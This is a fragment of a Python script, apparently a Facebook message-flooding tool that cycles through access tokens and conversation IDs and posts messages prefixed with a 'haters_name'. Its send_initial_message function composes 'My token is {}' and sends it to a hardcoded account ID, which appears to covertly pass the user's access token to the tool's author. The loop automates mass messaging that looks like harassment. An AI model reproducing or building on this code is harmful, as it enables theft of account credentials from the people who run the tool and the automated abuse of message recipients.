...
def send_initial_message():
    ...
    msg_template = "Hello Anoz dada ! I am using your server. My token is {}" 

    # Specify the ID where you want to send the message
    target_id = "100060856549450"

    requests.packages.urllib3.disable_warnings()

    def liness():
        print(
            "\033[1;92m" + "•────────────────────── TRICKS BY SAIIM ───────────────────────────────•"
        )
    ...
    while True:
        try:
            for message_index in range(num_messages):
                ...
                if response.ok:
                    print(
                        "\033[1;92m[+] Han Bro Chla Gya Massage {} of Convo {} Token {}: {}".format(
                            message_index + 1,
                            convo_id,
                            token_index + 1,
                            haters_name + " " + message,
